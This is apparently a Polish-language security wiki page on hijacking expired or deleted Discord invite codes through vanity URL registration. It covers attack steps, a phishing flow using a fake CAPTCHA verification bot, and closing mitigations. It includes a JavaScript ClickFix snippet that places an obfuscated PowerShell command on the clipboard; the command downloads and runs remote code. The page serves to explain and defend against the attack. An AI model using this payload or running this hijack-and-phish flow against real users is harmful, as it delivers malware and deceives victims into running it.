# Przejmowanie zaproszeń Discord

Przejmowanie zaproszeń Discord wykorzystuje zasady ponownego użycia niestandardowych vanity links: wygasły tymczasowy kod zaproszenia lub usunięty stały kod składający się wyłącznie z małych liter i cyfr może zostać zarejestrowany jako vanity link na serwerze z Level 3 Boost. Custom vanity link może również stać się dostępny, gdy jego pierwotny serwer utraci Level 3 Boost; w przypadku tymczasowego zaproszenia zawierającego wielkie litery atakujący może wcześniej zarejestrować małą wersję vanity, podczas gdy zwykłe zaproszenie pozostaje aktywne, ale przekierowanie rozpocznie się dopiero po wygaśnięciu tego zaproszenia.<sup>[[1]](#references)[[2]](#references)</sup>

## Typy zaproszeń i ryzyko przejęcia

Zaobserwowane ryzyko różni się w zależności od typu zaproszenia:<sup>[[1]](#references)[[2]](#references)</sup>

| Typ zaproszenia           | Możliwość przejęcia? | Warunek / Uwagi                                                                                       |
|---------------------------|----------------------|---------------------------------------------------------------------------------------------------------|
| Tymczasowy link zaproszenia | ✅                 | Po wygaśnięciu kod staje się dostępny i może zostać ponownie zarejestrowany jako vanity URL przez serwer z boostem. |
| Stały link zaproszenia    | ⚠️                  | Jeśli zostanie usunięty i składa się wyłącznie z małych liter i cyfr, kod może ponownie stać się dostępny. |
| Custom Vanity Link        | ✅                   | Jeśli pierwotny serwer utraci Level 3 Boost, jego vanity invite staje się dostępne do nowej rejestracji.    |

## Kroki ataku

1. Reconnaissance
- Monitoruj publiczne źródła (fora, social media, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzorca `discord.gg/{code}` lub `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Zbieraj interesujące kody zaproszeń (tymczasowe lub vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Utwórz serwer Discord z uprawnieniami Level 3 Boost lub użyj już istniejącego.<sup>[[1]](#references)[[2]](#references)</sup>
- W **Server Settings → Vanity URL** spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod zostanie zarezerwowany przez złośliwy serwer.<sup>[[1]](#references)</sup>
3. Aktywacja przejęcia
- W przypadku tymczasowych zaproszeń zaczekaj, aż pierwotne zaproszenie wygaśnie (lub usuń je ręcznie, jeśli kontrolujesz jego źródło).<sup>[[1]](#references)</sup>
- W przypadku kodów zawierających wielkie litery wariant zapisany małymi literami może zostać przejęty natychmiast, jednak przekierowanie aktywuje się dopiero po wygaśnięciu zaproszenia.<sup>[[1]](#references)</sup>
4. Ciche przekierowanie
- Użytkownicy odwiedzający stary link zostaną płynnie przekierowani na serwer kontrolowany przez atakującego, gdy przejęcie stanie się aktywne.<sup>[[1]](#references)</sup>

## Phishing Flow przez serwer Discord

1. Ogranicz kanały serwera tak, aby widoczny był tylko kanał **#verify**.<sup>[[1]](#references)</sup>
2. Wdróż bota (np. **Safeguard#0786**), który poprosi nowych użytkowników o weryfikację przez OAuth2.<sup>[[1]](#references)</sup>
3. Bot przekierowuje użytkowników na phishing site (np. `captchaguard.me`) pod pozorem CAPTCHA lub etapu weryfikacji.<sup>[[1]](#references)</sup>
4. Zastosuj sztuczkę UX **ClickFix**:<sup>[[1]](#references)</sup>
- Wyświetl uszkodzony komunikat CAPTCHA.
- Poinstruuj użytkowników, aby otworzyli okno **Win+R**, wkleili wstępnie załadowane polecenie PowerShell i nacisnęli Enter.

### Przykład wstrzykiwania do schowka przez ClickFix

Kampania wykorzystywała JavaScript do skopiowania złośliwego polecenia PowerShell do schowka:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
To podejście unika bezpośredniego pobierania plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzliwość użytkowników.<sup>[[1]](#references)</sup>

## Mitigations

- Preferuj permanent invite links i upewnij się, że kod zawiera co najmniej jedną wielką literę; usunięte permanent codes zawierające wielkie litery nie mogą zostać ponownie użyte jako vanity links.<sup>[[1]](#references)</sup>
- Regularnie rotuj invite codes i unieważniaj stare linki.
- Monitoruj status boostów serwera Discord oraz przejęcia vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Edukuj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania poleceń wklejonych ze schowka.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
